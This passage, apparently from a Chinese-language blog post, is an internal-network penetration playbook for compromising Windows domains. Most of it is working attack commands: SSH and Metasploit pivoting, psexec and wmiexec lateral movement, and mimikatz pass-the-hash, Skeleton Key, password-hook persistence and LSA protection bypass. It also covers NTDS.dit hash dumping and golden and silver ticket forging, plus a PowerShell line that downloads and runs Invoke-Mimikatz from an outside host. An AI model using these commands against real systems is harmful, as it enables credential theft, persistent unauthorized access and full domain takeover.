&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;开启代理&quot;&gt;开启代理&lt;/h3&gt;

&lt;p&gt;获取10.10.1.1/24网段访问权限。
ssh动态转发 (本地开启socks代理)&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh -qTfNCD 0.0.0.0:8081 root@10.10.1.110 (在10.10.2.120上执行)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;外网机器IP可访问内网机3306：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh -L 3306:外网机器ip:3306   user@隔离机器IP    -N
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;ssh静态转发 (通过本机10.10.3.130的20000端口可以获得10.10.1.1/24网段访问权限)&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh -qTfNCL 0.0.0.0:20000:10.10.2.120:8081 root@10.10.3.130
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;(通过10.10.3.130,将10.10.2.120的8081端口转发到本地20000端口)&lt;/p&gt;

&lt;p&gt;metasploit:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;portfwd add -l 4445 -p 445 -r 10.10.10.111 (把内网另外一台主机的445端口转到在msf的4445端口)

msf开启socks4代理, 并添加内网路由, msf内部模块可直接通过session路由访问内网, 外部程序可通过socks4代理访问内网。

use auxiliary/server/socks4a | run (msf开启socks4代理, 默认是1080端口)
msf exploit(handler) &amp;gt; sessions
Active sessions
===============
  Id  Type                     Information                                      Connection
  --  ----                     -----------                                      ----------
  1   meterpreter x86/windows  MICROSOF-CA98DC\Administrator @ MICROSOF-CA98DC  192.168.71.196:58308 -&amp;gt; 192.168.71.167:443 (192.168.71.167)
msf exploit(handler) &amp;gt; route add 192.168.71.196/24 1
[*] Route added
msf exploit(handler) &amp;gt; route
IPv4 Active Routing Table
=========================
  Subnet             Netmask            Gateway
  ------             -------            -------
  192.168.71.196     255.255.255.0      Session 1
[*] There are currently no IPv6 routes defined。
msf exploit(handler) &amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;横向执行命令&quot;&gt;横向执行命令&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;net use x: \\[目标IP]\[地址] [域用户password] /user:[域]\[username]

(python版的psexec) psexec.py administrator:123456@192.168.71.165 -port 445

at \\192.168.200.100 15:00 c:\hack.bat

psexec \\192.168.1.2 c:\hack.bat【执行单条命令】
psexec \192.168.200.100 cmd【半交互shell】
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;上面是提供账号密码的情况，如果有时候我们抓取到的是hash，破解不了时可以利用WCE的hash注入【传递】，然后再执行WMIEXEC（不提供账号密码）就可以了。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cscript.exe //nologo wmiexec.vbs /shell 192.168.1.1 username password【半交互shell】
cscript.exe  wmiexec.vbs /cmd 192.168.1.1 username password  &quot;command&quot;【执行单条命令】
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;wce注入hash后进行命令执行&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wce -s [hash] 
cscript.exe //nologo wmiexec.vbs /shell 192.168.1.1
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;运行时间长的命令时，如ping,systeminfo之类的，记得加上-wait5000或者更久的时间选项。
运行nc反弹或者木马等不需要输出结果、同时需要一直运行的程序时，一定要加上-persist选项，不然你就只能去taskkill远程结束进程了。&lt;/p&gt;

&lt;p&gt;使用NTLM hash远程连接：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;以管理员权限运行：
mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:a /domain:test.local /ntlm:efa85b42d77dc2fdbdbdb767792b0a11&quot;
dir \\192.168.40.132\c$
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;注:
虽然”sekurlsa::pth”在mimikatz中被称之为”Pass The Hash”,但是其已经超越了以前的”Pass The Hash”，部分人将其命名为”Overpass-the-hash”，也就是”Pass-the-key”&lt;/p&gt;

&lt;p&gt;使用aes key远程连接（kb2871997 Installed）：
获取aes key 的mimikatz命令为：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;privilege::debug
sekurlsa::ekeys
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;无法复制时，开启日志记录功能后会把输出回显的内容保存在同级目录下的mimikatz.log中：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mimikatz log privilege::debug sekurlsa::ekeys
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;以管理员权限运行：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;privilege::debug
sekurlsa::pth /user:a /domain:test.local /aes256:f74b379b5b422819db694aaf78f49177ed21c98ddad6b0e246a7e17df6d19d5c&quot; 
privilege::debug
sekurlsa::pth /user:a /domain:test.local /aes128:8cce86e4b0630f07fcf5f2110068c421&quot; 

dir \\WIN-8VVLRPIAJB0\c$
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;注意：&lt;/p&gt;

&lt;p&gt;这里dir要使用主机名 而不是ip，不然会提示用户名或密码错误。&lt;/p&gt;

&lt;h3 id=&quot;保持权限&quot;&gt;保持权限&lt;/h3&gt;

&lt;p&gt;这块儿东西太多，只能简单提下，有机会单独撰文分析。&lt;/p&gt;

&lt;h5 id=&quot;linux后门&quot;&gt;Linux后门&lt;/h5&gt;
&lt;p&gt;webshell，rootkit，改普通用户权限，在某些服务和软件上做手脚，添加ssh-key，添加键盘钩子。&lt;/p&gt;

&lt;h5 id=&quot;win后门&quot;&gt;Win后门&lt;/h5&gt;
&lt;p&gt;webshell，劫持dll，劫持在login界面能触发的软件，添加隐藏用户，克隆用户，加远控，powershel脚本，各种票据，开盘符共享，在某些服务和软件上做手脚，添加键盘钩子。&lt;/p&gt;

&lt;h5 id=&quot;维持域控权限&quot;&gt;维持域控权限&lt;/h5&gt;

&lt;p&gt;1.直接获取lsass.exe（SSP）中的明文密码：
修改域控注册表位置，在Security Packages下添加mimilib.dll：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\Security Packages\
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;域控重启后在c:\windows\system32可看到新生成的文件kiwissp.log，里面记录了密码。
mimikatz同时还支持通过内存更新ssp，这样就不需要重启再获取账户信息：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;privilege::debug
misc::memssp
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;2.Hook PasswordChangeNotify无痕，不需要重启和修改注册表，生成dll注入的powershell脚本：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://github.com/clymb3r/Misc-Windows-Hacking/blob/master/HookPasswordChange/Debug/HookPasswordReset.dll

https://github.com/clymb3r/PowerShell/blob/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1
在代码尾部添加如下代码：
Invoke-ReflectivePEInjection -PEPath HookPasswordChange.dll –procname lsass
并命名为HookPasswordChangeNotify.ps1

上传HookPasswordChangeNotify.ps1和HookPasswordChange.dll，管理员权限执行：
PowerShell.exe -ExecutionPolicy Bypass -File HookPasswordChangeNotify.ps1
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;域控更新密码后（手动），在C:\Windows\Temp下可以找到passwords.txt，其中记录了新修改的密码。&lt;/p&gt;

&lt;p&gt;3.Skeleton Key（不需要域控重启）
正常登录域控：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;net use \\WIN-8VVLRPIAJB0.test.local 12345678!Q /user:a@test.local
dir \\WIN-8VVLRPIAJB0.test.local\c$
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;mimikatz在域控上安装Skeleton Key：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;privilege::debug
misc::skeleton
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;使用Skeleton Key登录，mimikatz的默认Skeleton Key设置为mimikatz，权限不变，只是万能密码：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;net use */del /y
net use \\WIN-8VVLRPIAJB0.test.local mimikatz /user:a@test.local
dir \\WIN-8VVLRPIAJB0.test.local\c$
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;4.绕过LSA保护策略，似乎需要自带的mimidrv.sys文件：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;privilege::debug
!+
!processprotect /process:lsass.exe /remove
misc::skeleton
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;本地组策略禁用一些重要组件后，使用mimikatz绕过：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;privilege::debug
misc::cmd
misc::regedit
misc::taskmgr
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;扫描内网&quot;&gt;扫描内网&lt;/h3&gt;

&lt;h5 id=&quot;漏洞扫描&quot;&gt;漏洞扫描&lt;/h5&gt;

&lt;p&gt;漏洞扫描跟外网不同的是，流量需要控制，但是多数情况下是不会有WAF和防火墙的。&lt;/p&gt;

&lt;p&gt;当然，在大一点的内网，如果没有流量监控和分析一般是可能性比较小的。&lt;/p&gt;

&lt;p&gt;使用脚本漏洞扫描【如awvs】和路径爆破【如御剑】，操作大体与外网扫描相似。&lt;/p&gt;

&lt;p&gt;其实国人也写过不少优秀的自研扫描器，里面有部分是内网专用的：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://github.com/We5ter/Scanners-Box
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h5 id=&quot;信息探测&quot;&gt;信息探测&lt;/h5&gt;

&lt;p&gt;这类漏扫一般都会提供，可能会探测特定的服务、探测Title等等，但一些专有用途的刺探脚本也许会优于综合型漏扫。&lt;/p&gt;

&lt;h5 id=&quot;服务探测&quot;&gt;服务探测&lt;/h5&gt;

&lt;p&gt;服务探测主要使用nmap、masscan一类的端口扫描器，他们存有banner可以和数据库里存储的服务版本进行对比，从而给我们输出相关信息。&lt;/p&gt;

&lt;h5 id=&quot;口令爆破&quot;&gt;口令爆破&lt;/h5&gt;

&lt;p&gt;一般像hscan【windows】或者hydra【跨平台】的会比较合适，如果能做sock或者http/https代理的话，如Nmap/MSF里script的效果也是不错的。
至于国内传统厂商出的一些扫描器则显得比较笨拙，做自检还勉强，部署也相当麻烦。&lt;/p&gt;

&lt;h3 id=&quot;攻击域控&quot;&gt;攻击域控&lt;/h3&gt;

&lt;h5 id=&quot;导出域内用户hash&quot;&gt;导出域内用户hash&lt;/h5&gt;

&lt;blockquote&gt;
  &lt;p&gt;1.gethashes.exe $local&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;2.mimikatz&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;privilege::debug
sekurlsa::logonpasswords
获得域控权限、导出所有用户口令、维持域控权限：

附上一套完整打法：
http://blog.csdn.net/pyphrb/article/details/52051321
攻击域控，获得权限

使用ms14-068漏洞
ms14-068.exe -u -p -s -d 【这里参数值省略】

生成伪造缓存test.ccache: 
导入伪造缓存: mimikatz：
kerberos::ptc test.ccache

登陆：
net use \\A-635ECAEE64804.TEST.LOCAL
dir \\A-635ECAEE64804.TEST.LOCAL\c$

导出域
（1）直接获取内存口令 mimikatz：
privilege::debug
sekurlsa::logonpasswords
（2）通过内存文件获取口令 使用procdump导出lsass.dmp mimikatz：

sekurlsa::minidump lsass.dmp
sekurlsa::logonPasswords full
（3）通过powershell加载mimikatz获取口令

powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz
（4）导出所有用户口令 使用Volue Shadow Copy获得SYSTEM、SAM备份（之前文章有介绍） mimikatz：

lsadump::sam SYSTEM.hiv SAM.hiv持域控权限

（1）Skeleton Key mimikatz：

privilege::debug
misc::skeleton
万能钥匙，可使用任意用户登陆域控

net use \\A-635ECAEE64804.TEST.LOCAL mimikatz /user：test

4、维持域控权限
（1）Skeleton Key mimikatz：

privilege::debug
misc::skeleton
万能钥匙，可使用任意用户登陆域控

net use \\A-635ECAEE64804.TEST.LOCAL mimikatz /user：test
这里写图片描述 
（2）golden ticket mimikatz：

lsadump::lsa /patch 
获取krbtgt的ntlmhash

生成万能票据： mimikatz：

kerberos::golden /user:Administrator /domain:test.local /sid:S-1-5-21-2848411111-3820811111-1717111111 /krbtgt:d3b949b1f4ef947820f0950111111111 /ticket:test.kirbi
导入票据： mimikatz：

kerberos::ptt test.kirbi
登陆域控：

net use \\A-635ECAEE64804.TEST.LOCAL
dir \\A-635ECAEE64804.TEST.LOCAL\c$

（3）Pass-The-Hash mimikatz：

sekurlsa::pth /user:Administrator /domain:test.local /ntlm:cc36cf7a8514893efccd332446158b1a

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;3.pwdump【直接运行Pwdump7即可】&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;4.vssown.vbs + libesedb + NtdsXtract【太耗时】
http://pauldotcom.com/2011/11/safely-dumping-hashes-from-liv.html&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;5.ShadowCopy+QuarksPwDump【参考内容见下】：
http://blog.csdn.net/citelao/article/details/50948103&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;（1）使用ShadowCopy的命令行版，编写bat实现拷贝ntds.dit至当前目录

setlocal
if NOT &quot;%CALLBACK_SCRIPT%&quot;==&quot;&quot; goto :IS_CALLBACK
set SOURCE_DRIVE_LETTER=%SystemDrive%
set SOURCE_RELATIVE_PATH=\windows\ntds\ntds.dit
set DESTINATION_PATH=%~dp0
@echo ...Determine the scripts to be executed/generated...
set CALLBACK_SCRIPT=%~dpnx0
set TEMP_GENERATED_SCRIPT=GeneratedVarsTempScript.cmd
@echo ...Creating the shadow copy...
&quot;%~dp0vsshadow.exe&quot; -script=%TEMP_GENERATED_SCRIPT% -exec=&quot;%CALLBACK_SCRIPT%&quot; %SOURCE_DRIVE_LETTER%
del /f %TEMP_GENERATED_SCRIPT%
@goto :EOF
:IS_CALLBACK
setlocal
@echo ...Obtaining the shadow copy device name...
call %TEMP_GENERATED_SCRIPT%
@echo ...Copying from the shadow copy to the destination path...
copy &quot;%SHADOW_DEVICE_1%\%SOURCE_RELATIVE_PATH%&quot; %DESTINATION_PATH%
参考链接： http://blogs.msdn.com/b/adioltean/archive/2005/01/05/346793.aspx

（2）使用QuarksPwDump直接读取信息并将结果导出至文件，先执行

esentutl /p /o ntds.dit
修复复制出来的数据库

QuarksPwDump.exe -dhb -hist -nt ntds.dit -o log.txt
读取并导出。

注：实际使用时ntds.dit和log.txt需要加绝对路径

Tips：

QuarksPwDump.exe：Dump various types of Windows credentials without injecting in any process.
源码下载链接，vs2010直接编译即可
https://github.com/quarkslab/quarkspwdump
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;6.ntdsutil.exe + QuarksPwDump.exe【生成ntds.dit，再读取hash】&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#ntdsutil
#snapshot
#activate instance ntds
#create
#mount {GUID}
#copy c:\MOUNT_POINT\WINDOWS\NTDS\NTDS.dit c:\NTDS_saved.dit
#unmount {GUID}
#delete {GUID}
#quit
#quit

#QuarksPwDump.exe --dump-hash-domain --ntds-file c:\ntds.dit
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;7.powershell【比如上文提到的Invoke-mimikatz脚本】&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h5 id=&quot;hash传递&quot;&gt;hash传递&lt;/h5&gt;

&lt;p&gt;受限管理员模式顾名思义,只对管理员组有效.所以如果你获取到的用户属于远程桌面用户组,那么是无法通过hash登录的.会提示错误。&lt;/p&gt;

&lt;p&gt;mimikatz:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sekurlsa::pth /user:Administrator /domain:test.local /ntlm:cc36cf7a8514893efccd332446158b1a
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;MSF:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;use exploit/windows/smb/psexec

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Keimpx：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Keimpx -t ip -c ~/hash.txt -v 2
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;PTH套件：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Pth-winexe可以借助哈希执行程序得到一个cmdshell
Pth-winexe - U ... //ip cmd

参考：
http://blog.csdn.net/the__apollo/article/details/70474935

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;WCE：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wce -s ...
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;psexec/wmiexec：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;前面有提到用法，这里就不单独讲了。
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;附上横向域渗透【案例比较经典】&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://www.mottoin.com/89413.html
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;提取票据&quot;&gt;提取票据&lt;/h3&gt;

&lt;h5 id=&quot;传递票据&quot;&gt;传递票据&lt;/h5&gt;

&lt;p&gt;因为域用户对应sid本就可以通过程序自动获取，清除导入票据也能自动实现，当然，如果想用其他域用户信息攻击，也可以加上sid手动导入票据，kekeo的快捷用法仅需要以下参数：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://github.com/gentilkiwi/kekeo/releases

ms14068.exe /domain:test.local /user:test /password:test /ptt
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;在我们成功获得域控权限后，就可以导出域控内存中的Ticket，在默认的10个小时以内都可以利用来登录域控&lt;/p&gt;

&lt;p&gt;通过mimikatz导出内存中的Ticket，执行：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sekurlsa::tickets /export
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;保存成文件，一共导出如下文件，找个像这样的：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;xxx@krbtgt-TEST.LOCAL.kirbi
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;在域普通用户的主机进行导入：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mimikatz &quot;kerberos::ptt C:\test\xxx@krbtgt-TEST.LOCAL.kirbi&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;查看是否有域控权限，&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;klist
dir \\xxxx\c$
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;h5 id=&quot;金票据&quot;&gt;金票据&lt;/h5&gt;

&lt;p&gt;每个用户的Ticket都是由krbtgt的密码Hash来生成的，那么，我们如果拿到了krbtgt的密码Hash，不就可以随意伪造Ticket了吗？&lt;/p&gt;

&lt;p&gt;实际上只要拿到了域控权限，在上面就可以很容易的获得krbtgt的Hash值，再通过mimikatz即可生成任意用户任何权限的Ticket，也就是Golden Ticket。&lt;/p&gt;

&lt;p&gt;域控执行下面的命令，生成mimikatz.log记录输出，使用log输出是为了方便复制Hash值：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mimikatz log &quot;lsadump::dcsync /domain:test.local /user:krbtgt&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;找到如下的信息：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/domain：test.local
/sid:S-1-5-21-4155807533-921486164-2767329826 
/aes256:af71a24ea463446f9b4c645e1bfe1e0f1c70c7d785df10acf008106a055e682f
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;生成Golden Ticket,伪造的用户设置为god,执行下面的命令，生成文件gold.kirbi:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mimikatz &quot;kerberos::golden /domain:test.local /sid:S-1-5-21-4155807533-921486164-2767329826 
/aes256:af71a24ea463446f9b4c645e1bfe1e0f1c70c7d785df10acf008106a055e682f /user:god 
/ticket:gold.kirbi&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;注意，生成Golden Ticket不仅可以使用aes256，也可用krbtgt的NTLM hash，可以用mimikatz “lsadump::lsa /patch”导出。&lt;/p&gt;

&lt;p&gt;导入Golden Ticket：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mimikatz# kerberos::ptt c:\test\gold.kirbi
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;检验是否成功获得域控权限：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c:&amp;gt;klist
c:&amp;gt;dir \\xxxx\c$
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;注意：
这种方式导入的Ticket默认在20分钟以内生效，当然，如果过期了，再次ptt导入Golden Ticket就好。可以伪造任意用户，即使其不存在。可以伪造任意用户，即使其不存在。&lt;/p&gt;

&lt;p&gt;另一种做法，大同小异，注意这里填写的是域管理：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mimikatz # kerberos::purge
mimikatz # kerberos::golden /admin:Administrator /domain:pentstlab.com /sid:S-1-5-21-3883552807-251258116-2724407435 /krbtgt:6a8e501fabcf264c70ef3316c6aab7dc /ticket:Administrator.kiribi
mimikatz # kerberos::ptt Administrator.kiribi
mimikatz # kerberos::tgt

#验证下：
E:\&amp;gt;net use \\WIN-0DKN2AS0T2G\c$
E:\&amp;gt;psexec.exe \\WIN-0DKN2AS0T2G cmd
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h5 id=&quot;银票据&quot;&gt;银票据&lt;/h5&gt;
&lt;p&gt;Silver Ticket是伪造的TGS(Ticket Granting Server)ticket，所以也叫service ticket。
将它同Golden Ticket做对比：&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;1、访问权限不同
Golden Ticket是伪造的TGT(Ticket Granting Ticket)，所以可以获取任何Kerberos服务权限。
Silver Ticket是伪造的TGS，也就是说其范围有限，只能访问指定的服务权限。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;2、加密方式不同
Golden Ticket是由krbtgt的hash加密
Silver Ticket是由服务账户（通常为计算机账户）hash加密&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;3、认证流程不同
Golden Ticket在使用的过程需要同域控通信
Silver Ticket在使用的过程不需要同域控通信
也就是说只要手里有Silver Ticket，就可以跳过KDC认证，直接去访问指定的服务。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;在域控上执行如下命令来获取域控主机的本地管理员账户hash：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mimikatz log &quot;sekurlsa::logonpasswords&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;整理信息，使用mimikatz执行如下命令导入Silver Ticket，此时可以成功访问域控上的文件共享：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mimikatz &quot;kerberos::golden /domain:test.local /sid:S-1-5-21-4155807533-921486164-2767329826 /target:WIN-8VVLRPIAJB0.test.local /service:cifs /rc4:d5304f9ea69523479560ca4ebb5a2155 /user:silver /ptt&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;注意：
Silver Ticket是伪造的TGS，也就是说其范围有限，只能访问指定的服务权限。
代替方案，如下可以远程访问LDAP服务来获得krbtgt的信息：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mimikatz &quot;lsadump::dcsync /dc:WIN-8VVLRPIAJB0.test.local /domain:test.local /user:krbtgt&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;注意：&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;lsadump::dcsync
向 DC 发起一个同步对象（可获取帐户的密码信息）的质询。
需要的权限包括管理员组（Administrators），域管理员组（ Domain Admins）或企业管理员组（Enterprise Admins）以及域控制器的计算机帐户
只读域控制器默认不允许读取用户密码数据。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;中间人攻击&quot;&gt;中间人攻击&lt;/h3&gt;

&lt;p&gt;中间人攻击有很多方法，有借助arp进行双向欺骗嗅探，有借助内网DNS劫持的，有借助断网重连直接劫持的。&lt;/p&gt;

&lt;p&gt;经典的工具有netfuke，cain，ettercap等等。&lt;/p&gt;

&lt;p&gt;具体的在此不多说，以后有机会继续补充。&lt;/p&gt;

&lt;h3 id=&quot;跨网段攻击&quot;&gt;跨网段攻击&lt;/h3&gt;

&lt;h5 id=&quot;借助多网卡主机&quot;&gt;借助多网卡主机&lt;/h5&gt;

&lt;p&gt;如果在多网卡主机的情况下，我们可以通过msf建立路由，然后转发，最终通过sock建立代理。&lt;/p&gt;

&lt;h5 id=&quot;借助交换机路由&quot;&gt;借助交换机/路由&lt;/h5&gt;

&lt;p&gt;一般大一点的路由，或者三、四层交换机可能会提供VPN功能，通过命令行或者WEB界面能操作进行启用或转发。
当然部分命令行被封装在沙盒里，功能是比较有限的。&lt;/p&gt;

&lt;h5 id=&quot;借助代理&quot;&gt;借助代理&lt;/h5&gt;

